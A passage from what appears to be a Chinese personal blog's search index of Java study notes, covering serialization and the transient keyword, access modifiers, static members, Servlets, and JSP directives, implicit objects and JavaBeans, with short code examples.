序列化对static和transient变量，是不会自动进行状态保存的。transient的作用就是，用transient声明的变量，不会被自动序列化。 对于Socket, Thread类，不支持序列化。若实现序列化的接口中，有Thread成员；在对该类进行序列化操作时，编译会出错！ static与transient首先说一下序列化对static和transient的处理吧，我们将之前的代码中Box类修改一下123456789101112131415class Box implements Serializable &#123; private static int width; private transient int height; private String name; public Box(String name, int width, int height) &#123; this.name = name; this.width = width; this.height = height; &#125; public String toString() &#123; return &quot;[&quot;+name+&quot;: (&quot;+width+&quot;, &quot;+height+&quot;) ]&quot;; &#125;&#125; 将成员变量的类型修改为static和transient，运行一下，结果： 前面说得，序列化不对static和transient变量进行状态保存的。因此，testWrite()中保存Box对象时，不 会保存width和height的值。但是为什么testRead()读出来的Box对象中width=80，而height=0呢？ 对于height，因为Box对象中height是int类型，而int类型默认是0，因此height为0. 而对于width，它是static类型，而static类型意味着所有Box对象都公用一个heith值，而在testWrite()中，我们已经将其初始化为80，因此，我们通过序列化读出来width也是80. 那么，如果我们想要保存static或transient变量，也是可以的，只要重写两个方法writeObject()和readObject()即可。还是Box类123456789101112131415161718192021222324252627class Box implements Serializable &#123; private static int width; private transient int height; private String name; public Box(String name, int width, int height) &#123; this.name = name; this.width = width; this.height = height; &#125; private void writeObject(ObjectOutputStream out) throws IOException&#123; out.defaultWriteObject(); out.writeInt(height); out.writeInt(width); &#125; private void readObject(ObjectInputStream in) throws IOException,ClassNotFoundException&#123; in.defaultReadObject(); height = in.readInt(); width = in.readInt(); &#125; public String toString() &#123; return &quot;[&quot;+name+&quot;: (&quot;+width+&quot;, &quot;+height+&quot;) ]&quot;; &#125;&#125; 在writeObject()方法中，out.defaultWriteObject()是使定制的writeObject()方法可以利用自动序列化中内置的逻辑 在readObject()方法中，in.defaultReadObject()也是使定制的readObject()方法可以利用自动序列化中内置的逻辑。 Socket、Thread类 在Box类中添加123456private Thread thread = new Thread() &#123; public void run() &#123; System.out.println(&quot;Serializable thread&quot;); &#125;&#125;; 运行发现，直接编译报错！ 事实证明，不能对Thread进行序列化，若希望程序能便宜通过，我们对Thread变量添加static或transient修饰符即可。 0x04 完全定制序列化过程Externalizable如果一个类要完全负责自己的序列化，则实现Externalizable接口，而不是Serializable接口。 Externalizable接口定义包括两个方法writeExternal()与readExternal()。需要注意的是：声明类实现Externalizable接口会有重大的安全风险。writeExternal()与readExternal()方法声明为public，恶意类可以用这些方法读取和写入对象数据。如果对象包含敏感信息，则要格外小心。实例：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.ObjectOutput; import java.io.ObjectInput; import java.io.Serializable; import java.io.Externalizable; import java.io.IOException; import java.lang.ClassNotFoundException; public class ExternalizableTest1 &#123; private static final String TMP_FILE = &quot;.externalizabletest1.txt&quot;; public static void main(String[] args) &#123; testWrite(); testRead(); &#125; private static void testWrite() &#123; try &#123; ObjectOutputStream out = new ObjectOutputStream( new FileOutputStream(TMP_FILE)); Box box = new Box(&quot;desk&quot;, 80, 48); out.writeObject(box); System.out.println(&quot;testWrite box: &quot; + box); out.close(); &#125; catch (Exception ex) &#123; ex.printStackTrace(); &#125; &#125; private static void testRead() &#123; try &#123; ObjectInputStream in = new ObjectInputStream( new FileInputStream(TMP_FILE)); Box box = (Box) in.readObject(); System.out.println(&quot;testRead box: &quot; + box); in.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125;class Box implements Externalizable &#123; private int width; private int height; private String name; public Box() &#123; &#125; public Box(String name, int width, int height) &#123; this.name = name; this.width = width; this.height = height; &#125; public void writeExternal(ObjectOutput out) throws IOException &#123; &#125; public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException &#123; &#125; public String toString() &#123; return &quot;[&quot;+name+&quot;: (&quot;+width+&quot;, &quot;+height+&quot;) ]&quot;; &#125;&#125; 0x05 参考文献http://www.cnblogs.com/skywang12345/p/io_06.html]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Java</tag>
        <tag>Java安全</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java访问修饰符归纳]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E8%AE%BF%E9%97%AE%E4%BF%AE%E9%A5%B0%E7%AC%A6%E5%BD%92%E7%BA%B3%2F</url>
    <content type="text"><![CDATA[private ——— 仅对本类可见 protected ——— 对本包和子类可见 public ——— 对所有类可见 默认 ——— 对本包可见，继承也不行]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java中的static]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84static%2F</url>
    <content type="text"><![CDATA[0x01 static的作用static代表它修饰的那个东西是属于整个类的。 0x02 static的特点 static修饰的内容，是随着类的加载而加载。当JVM把字节码加载到虚拟机当中，static它修饰的成员会自动地加载到内存中（方法区） static修饰的内容，优先于对象存在 static修饰的内容，被该类对象所共享 static修饰的内容，可以通过类名来访问 static修饰的方法，在编译的时候就确定了其类型，所以用类来调用而不是对象来调用。 0x03 类中的成员类中的成员分为类成员和实例成员 类成员就是使用static修饰的成员实例成员就是不使用static修饰的成员]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Servlet]]></title>
    <url>%2F2018%2F05%2F30%2FServlet%2F</url>
    <content type="text"><![CDATA[0x01 概述Jsp的前身就是Servlet。Servlet是在服务器上运行的小程序，它就是一个java类，并且可以通过请求-响应编程模型来访问的这个驻留在服务器内存里的serlvet程序。 0x02 Tomcat容器等级Tomcat容器分为四个等级，Servlet的容器管理Context容器，一个Context对应一个Web工程。 0x03 编写Servlet 继承HttpServlet 重写doGet()或者doPost()方法 在web.xml中注册Servlet Servlet编写1234567891011121314151617181920212223242526import javax.servlet.http.HttpServletimport java.io.PrintWriterpublic class HelloServlet extends HttpServlet &#123; protected void doGet (HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; System.out.println(&quot;Get request&quot;); resp.setContentType(&quot;text/html&quot;); PrintWriter out = resp.getWriter(); out.println(&quot;&lt;strong&gt;HelloServlet!&lt;/strong&gt;&lt;br&gt;&quot;); out.flush(); out.close(); &#125; protected void doPost (HttpServletRequest, req, HttpServletResponse resp) throws ServletException, IOException &#123; System.out.println(&quot;Post request&quot;); resp.setContentType(&quot;text/html&quot;); PrintWriter out = resp.getWriter(); out.println(&quot;&lt;strong&gt;HelloServlet&lt;/strong&gt;&quot;); out.flush(); out.close(); &#125;&#125; 配置web.xml12345678&lt;servlet&gt; &lt;servlet-name&gt;HelloServlet&lt;servlet-name&gt; &lt;servlet-class&gt;servlet.HelloServlet&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/servlet/HelloServlet&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; 在上面web.xml里，标签中的servlet.HelloServlet是我们编写的Servlet中的类名 中的url-pattern是要访问的url路径 0x04 Servlet与九大内置对象12345678910内置对象 怎样获得out resp.getWriter()request service方法的req参数response service方法的resp参数session req.getSession()函数application getServletContext()函数exception Throwablepage thispageContext PageContext Config getServletConfig()函数 0x05 Servlet执行顺序 构造方法 init初始化方法 service方法 –&gt; doGet()和doPost()方法 destroy方法]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Jsp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows下命令行运行java程序]]></title>
    <url>%2F2018%2F05%2F30%2FWindows%E4%B8%8B%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%BF%90%E8%A1%8Cjava%E7%A8%8B%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[0x01 准备在运行java程序之前需要将环境变量配好，检查CLASSPATH和JAVA_HOME时候都弄好了 0x02 运行编译java文件1javac xxx.java xxx为java文件中的类名称，一定要相同才行，否则会报错这时，当前目录下会产生一个xxx.class文件 运行.class文件1java xxx 这里不用在后面加.class运行成功~]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jsp学习笔记]]></title>
    <url>%2F2018%2F05%2F30%2Fjsp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[0x01 jsp的指令标签&lt;%@page %&gt; 定义网页依赖属性，比如脚本语言、error页面、缓存需求等等。&lt;%@include%&gt; 包含其他文件。包含的文件就好像是该JSP文件的一部分，会被同时编译执行。&lt;%@taglib%&gt; 引入标签库的定义。 0x02 jsp的动作标签与存取javabean有关（3只）jsp:usebean 加载一个将在JSP页面中使用的JavaBean。jsp:setProperty 设置已经实例化的Bean对象的属性第一种：12345用法：&lt;jsp:usebean id=&quot;myName&quot; /&gt;.....&lt;jsp:setProperty name=&quot;myName&quot; property=&quot;someProperty&quot; value=&quot;someValue&quot;/&gt;不管jsp:useBean是找到了一个现有的Bean，还是新创建了一个Bean实例，jsp:setProperty都会执行 第二种：12345用法：&lt;jsp:usebean id=&quot;myName&quot;&gt;&lt;jsp:setProperty name=&quot;myName&quot; property=&quot;someProperty&quot; value=&quot;someValue .../&gt;&lt;/jsp:usebean&gt;jsp:setProperty只有在新建Bean实例时才会执行，如果是使用现有实例则不执行jsp:setProperty。 name和property是必须的，前者选择要用哪个bean，一般是usebean的id属性，后者表示是要设置的变量名。jsp:getProperty获取Bean的属性的值并将之转化为一个字符串，将其插入到页面中1&lt;jsp:getProperty name=&quot;someName&quot; property=&quot;someProperty&quot;&gt; 基本动作元素（6只）jsp:include 包含静态和动态的文件。 插入文件的时间是在页面被请求的时候。1&lt;jsp:include file=&quot;xx.jsp&quot; flush=&quot;true&quot;&gt; jsp:forward 把请求转到另外的页面。1&lt;jsp:forward page=&quot;相对 URL 地址&quot; /&gt; jsp:plugin用来在JSP中嵌入Java插件123456789101112131415&lt;jsp:plugin&gt; type=&quot;bean | applet&quot; name=&quot;Applet名称&quot; code=&quot;java类名&quot; codebase=&quot;Java类所在目录&quot; align=&quot;对齐方式&quot; height=&quot;高度&quot; width=&quot;宽度&quot; hspace=&quot;水平间距&quot; vspace=&quot;垂直间距&quot; archive=&quot;预先加载的类列表&quot; jreversion=&quot;JRE版本&quot; iepluginurl=&quot;URL&quot; nspluginurl=&quot;URL&quot; &lt;/jsp:plugin&gt; jsp:paramjsp:params12345&lt;jsp:plugin&gt; &lt;jsp:params&gt; &lt;jsp:param name=&quot;参数名&quot; value=&quot;参数值&quot; /&gt; &lt;/jsp:params&gt; &lt;/jsp:plugin&gt; jsp:fallback用来指定当浏览器不支持或者无法启动Bean或Applet时，在页面上打印输出错误提示信息。12345&lt;jsp:plugin&gt; &lt;jsp:fallback&gt; 错误信息 &lt;/jsp:fallback&gt; &lt;/jsp:plugin&gt; 与JSP Document相关（6只）jsp:rootjsp:declarationjsp:scriptletjsp:expressionjsp:textjsp:output 与动态生成XML标签有关（3只）jsp:attributejsp:bodyjsp:element 与Tag File有关（2只）jsp:invokejsp:dobody #0x03 jsp内置对象 request对象来自客户端的请求，经过servlet容器处理后，由request对象进行封装 javax.servlet.http.HttpServletRequest类的实例1234567891011121314request.getParameter(key) 获取表单提交的相应key的值 （&lt;% String name = request.getParameter(&quot;name&quot;);&gt;）request.getParameterValue(key) 获取表单提交的一组数据 （&lt;% String[] names = request.getParameterValue(&quot;names&quot;);&gt;）request.getHeaderNames() 获取http请求头的信息request.setAttribute(key.object) 设置请求对象的属性request.getAttribute(key) 获取请求对象的属性request.setCharacterEncoding(&quot;UTF-8&quot;) 对请求数据重新编码（解决post中文乱码问题，get不行）request.getContentType() 获取请求体的MIME类型request.getProtocol() 获取协议类型和版本类型request.getServerName() 获取服务器主机名request.getServerPort() 获取服务器端口号request.getContentLength() 获取请求文件的长度request.getRemoteAddr() 获取请求体的IP地址（xff不能伪装）request.getRealPath(&quot;request.jsp&quot;) 获取请求文件的绝对路径request.getContextPath() 获取请求的上下文路径 response对象封装了JSP响应，将响应发送回客户端 javax.servlet.http.HttpServletResponse类的实例1234response.setContentType(&quot;text/plain;charset=utf-8&quot;) 设置响应的MIME类型request.getRequestDispatcher(&quot;request.jsp&quot;).forward(request, response) 请求转发response.sendRedirect(&quot;xx.jsp&quot;) 页面跳转，与之前的forward不同，这个是跳转response.setCharaterEncoding(&quot;gbk&quot;) 设置响应的编码 session对象表示一个会话，用来保存用户的信息，以便跟踪用户，存在服务端，直到关闭网站或者注销账户，可以在浏览器浏览器之间切换，共享数据作用域：session javax.servlet.http.HttpSession类的实例1234567session.getid() 获取session的id号，该id号由tomcat自动分配session.isnew() 判断session是否是新建的session.setAttribute(key.object) 往当前会话中设置属性session.getAttribute(key) 从当前会话中得到属性session.removeAttribute(key) 从当前会话中删除一个属性session.setMaxInactiveInterval(1000*60*30) 设置当前会话的失效时间，tomcat默认30分钟session.invalidate() 初始化一个会话，删除会话 cookie对象cookie对象不是jsp的内置对象，需要构造，不过因为跟session很相似，就放在这边说了。123456789101112131415161718Cookie[] cookies = request.getCookie();String getName() 返回cookie的名字String getValue() 返回cookie的值接受CookieCookie[] cookies = request.getCookie();for (int i = 0; i &lt;= cookies.length; i++)&#123; if (&quot;username&quot;.equals(cookies[i].getName())) username = cookies[i].getValue(); if (&quot;password&quot;.equals(cookies[i].getName())) password = cookies[i].getValue();&#125;创建CookieCookie nameCookie = new Cookie(&quot;username&quot;, name);nameCookie.setMaxAge(60*60*24*30); 设置cookie生存周期Cookie pwdCookie = new Cookie(&quot;password&quot;, pwd);pwdCookie.setMaxAge(60*60*24*30);response.addCookie(nameCookie); 添加cookieresponse.addCookie(pwdCookie); application对象用户间数据的共享，全局变量 javax.servlet.ServletContext类的实例，代表着整个jsp页面123456789101112131415161718application.setAttribute(key.object) application.getAttribute(key)application.removeAttribute(key)实例：&lt;%application.setAttribute(&quot;city&quot;, &quot;北京&quot;);application.setAttribute(&quot;postcode&quot;, &quot;10000&quot;);application.setAttribute(&quot;email&quot;, &quot;123@123.com&quot;);%&gt;所在城市：&lt;%= application.getAttribute(&quot;city&quot;)%&gt;&lt;br /&gt;application的属性有：&lt;%Enumeration attributes = applicaiton.getAttributeNames();while(attribute.hasMoreElements()) out.println(attributes.nextElement()+&quot;&amp;nbsp;&amp;nbsp;&quot;);%&gt;&lt;br /&gt;JSP(SERVLET)引擎名以及版本号:&lt;%= application.getServerInfo()%&gt; config对象 javax.servlet.ServletConfig类的实例，这个对象允许开发者访问Servlet或者JSP引擎的初始化参数，比如文件路径等。 page对象 这个对象就是页面实例的引用。它可以被看做是整个JSP页面的代表。page 对象就是this对象的同义词。 page context对象 exception对象 out对象 javax.servlet.jsp.JspWriter 类的实例，用来在response对象中写入内容。作用域：page，也就是说每个page都有一个out对象1234out.print() 输出out.println() 输出后换行out.flush() 刷新输出流out.write() 输出 0x03 javabeansjavabeans就是符合某种特性的java类，减少代码重复 创建javabeans实例放到src的com.po包中：1234567891011121314151617181920212223package com.po;/** * 用户类**/public class Users()&#123; private String username; Private String password; //保留次构造方法 public User()&#123; &#125; public String getUsername()&#123; return username; &#125; public setUsername(String username)&#123; this.username = username; &#125; public String getPassword()&#123; return password; &#125; public setPassword(password)&#123; this.password = password; &#125;&#125; 使用javabeans实例12345678&lt;%@page import=&quot;com.po.Users&quot;%&gt;&lt;%Users user = new Users();user.setUsername(&quot;admin&quot;);user.setPassword(&quot;123456&quot;);%&gt;用户名：&lt;%= user.getUsername()%&gt;密码：&lt;%= user.getPassword()%&gt;]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
        <tag>Jsp</tag>
        <tag>Java Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello]]></title>
    <url>%2F2018%2F05%2F30%2FHello%2F</url>
    <content type="text"><![CDATA[Hello, This is my new blog - Pin0&apos;s Blog 之前一直在简书里写文章的，链接在这里 现在会逐步把简书的文章搬到我的博客里，各位看官要是看的不爽的，可以先收藏哦～]]></content>
      <categories>
        <category>Hello</category>
      </categories>
      <tags>
        <tag>Hello</tag>
      </tags>
  </entry>
</search>
